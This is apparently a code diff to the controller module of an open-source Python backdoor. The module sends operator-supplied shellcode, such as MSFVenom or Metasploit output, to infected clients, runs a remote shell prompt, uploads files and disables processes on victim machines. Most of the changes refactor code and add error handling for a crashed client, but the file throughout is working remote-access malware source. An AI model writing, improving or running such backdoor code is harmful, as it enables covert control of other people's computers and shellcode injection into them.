@@ -8,6 +8,7 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 import logging
 import os
 import re
+import socket
 import time
 
 from src import errors, helper
@@ -21,12 +22,9 @@ class Control:
         self.logger = logging.getLogger(LOGGER_ID)
 
     def shellcode(self):
-        if self.socket.get_curr_address()['x64_python']:
-            _encoding = "x64"
-        else:
-            _encoding = "x86"
+        _encoding = "x64" if self.socket.get_curr_address()['x64_python'] else "x86"
 
-        print(f"Enter {_encoding} unicode bytes eg. (\\x00\\) shellcode or MSFVenom py output (enter 'done', "
+        print(f"Enter {_encoding} unicode bytes eg. (\\x00\\) shellcode or metasploit py output (enter 'done', "
               f"or 'cancel' when fully entered)")
 
         data = r""
@@ -49,15 +47,17 @@ class Control:
         buf = buf.replace("\n", "")
         buf = buf.replace("\"", "")
 
-        test = bytearray(buf.encode().decode('unicode-escape').encode('ISO-8859-1'))
-
         self.socket.sendall_json(CLIENT_SHELLCODE, buf)
 
-        rsp = self.socket.recv_json()
-        if rsp["key"] == ERROR:
-            self.logger.error(rsp["value"])
-        elif rsp["key"] == SUCCESS:
-            self.logger.info("OK.")
+        try:
+            rsp = self.socket.recv_json()
+        except socket.error:
+            self.logger.critical("Client crashed!")
+        else:
+            if rsp["key"] == ERROR:
+                self.logger.error(rsp["value"])
+            elif rsp["key"] == SUCCESS:
+                self.logger.info("OK.")
 
     def info(self):
         out = ""
@@ -104,10 +104,7 @@ class Control:
 
         init = self.socket.recv_json()
 
-        if init["key"] == SERVER_SHELL_DIR:
-            prompt = f"{init['value']}>"
-        else:
-            prompt = ">"
+        prompt = f"{init['value']}>" if init["key"] == SERVER_SHELL_DIR else ">"
 
         while True:
             command = input(prompt)
@@ -232,7 +229,7 @@ class Control:
 
         out_file = os.path.normpath(helper.remove_quotes(input("Output File: ")))
 
-        if out_file == "":  # if the input is blank
+        if out_file == "" or file == "":  # if the input is blank
             return
 
         with open(file, "rb") as _file:
@@ -247,12 +244,8 @@ class Control:
         elif rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
 
-    def message(self, message):
-        self.socket.send_json(CLIENT_MSG, message)
-        self.logger.info("OK.")
-
-    def toggle_disable_process(self, process):
-        self.socket.send_json(CLIENT_DISABLE_PROCESS, process)
+    def toggle_disable_process(self, process, popup=False):
+        self.socket.send_json(CLIENT_DISABLE_PROCESS, {"process": process, "popup": popup})
 
         rsp = self.socket.recv_json()
 
